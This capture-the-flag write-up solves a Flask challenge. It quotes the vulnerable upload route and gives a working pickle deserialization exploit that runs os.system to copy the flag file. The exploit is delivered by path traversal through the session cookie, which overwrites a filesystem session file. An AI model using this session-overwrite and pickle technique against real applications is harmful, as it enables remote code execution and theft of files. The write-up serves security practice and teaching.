+ idea:flask session cookie pickle deserialization
```
@app.route('/', methods=['GET', 'POST'])
def index():
    path = f'static/uploads/{session.sid}' 
    if request.method == 'POST':
        f = request.files['file']
        if '..' in f.filename:
            return "bad", 400
        os.makedirs(path, exist_ok=True)
        f.save(path + '/' + f.filename)
        if not session.get('files'):
            session['files'] = []
        session['files'].append(f.filename)
        return redirect('/')
    return render_template('index.html', path=path, files=session.get('files', []))
```
+ Since the SESSION_TYPE is set to filesystem, whenever we log in to the application, a new session file is created in the /app/flask_session folder. The filename is calculated as the MD5 hash of the session cookie sid
+ The default hash_method used to generate the filename is MD5. So, if we provide a session cookie "session=ABC123" in our HTTP request, the application looks for the session file at /app/flask_session/MD5(ABC123) by default
+ We have arbitrary file write in session.sid. But we have permissions only /uploads and /flask-session
+ idea is to write a script so that the flag.txt is copied to /uploads so that we could see files in the uploads directory.
+ I set my cookie to xxx and uploaded a file on my local instance. This revealed that xxx mapped to 254b2716336df2553ce5c04a934d56e4 so we can use this as the name for our serialized Pickle object. We will upload the output of the following script to /app/flask_session/254b2716336df2553ce5c04a934d56e4 here:

exploit:
```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('cp /flag.txt /app/static/uploads/abcd.txt')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    return b"\x00"*4 + payload


with open("254b2716336df2553ce5c04a934d56e4", "wb") as f:
    f.write(generate_exploit())

```
+ Next, I set my session cookie to ../../flask_session and uploaded the file. This overwrote the session.
Then I set my session to xxx and refreshed the page. Lastly, I visited /static/uploads/abcd.txt path and got the flag!